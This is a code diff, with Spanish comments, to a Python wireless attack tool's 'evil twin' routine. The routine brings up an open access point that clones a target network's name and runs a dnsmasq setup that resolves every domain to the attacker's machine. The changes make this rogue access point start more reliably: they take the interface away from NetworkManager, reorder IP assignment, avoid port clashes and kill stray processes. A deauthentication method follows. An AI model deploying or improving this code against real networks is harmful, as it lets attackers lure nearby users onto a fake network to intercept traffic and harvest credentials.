@@ -1331,22 +1331,38 @@ if __name__ == "__main__":
             hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red['essid']}\nhw_mode=g\nchannel={int(red['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
             with open("/tmp/hostapd_evil.conf", "w") as f:
                 f.write(hostapd_conf)
+            
+            
             self.evil_twin_procs['hostapd'] = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
                                                                stdout=subprocess.DEVNULL,
                                                                stderr=subprocess.DEVNULL)
             time.sleep(3)
 
+            # 1. Quitarle el control a NetworkManager para que no borre nuestra IP
+            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
+            
+            # 2. Reiniciar la interfaz y forzar la asignación de IP
+            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            
+            # Crucial: Esperar a que el kernel de PiOS registre la IP antes de abrir dnsmasq
+            time.sleep(1.5) 
 
-            dnsmasq_conf = f"interface={ap_iface}\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
+            # 3. Configuración dnsmasq a prueba de fallos (except-interface=lo previene choques en el puerto 53)
+            dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
             with open("/tmp/dnsmasq_evil.conf", "w") as f:
                 f.write(dnsmasq_conf)
+            
+            # Limpiar procesos fantasma que hayan quedado colgados
+            subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
+            
             self.evil_twin_procs['dnsmasq'] = subprocess.Popen(
                 ["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(2)
+            # ===================================
 
             subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
@@ -1431,6 +1447,10 @@ if __name__ == "__main__":
             subprocess.run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            
+            # DEVOLVER CONTROL A NETWORKMANAGER
+            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "yes"], stderr=subprocess.DEVNULL)
+            
         subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)
 
     def _wifi_deauth(self):
